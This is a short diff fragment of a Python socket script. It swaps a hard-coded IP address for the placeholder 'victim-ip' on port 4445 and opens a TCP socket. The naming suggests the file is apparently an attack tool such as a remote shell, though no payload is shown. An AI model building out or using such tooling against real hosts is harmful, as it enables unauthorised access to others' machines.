@@ -16,7 +16,7 @@ import socket
 import os
 import sys
 
-ip = "142.93.112.220"
+ip = "victim-ip"
 port = 4445
 
 server =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
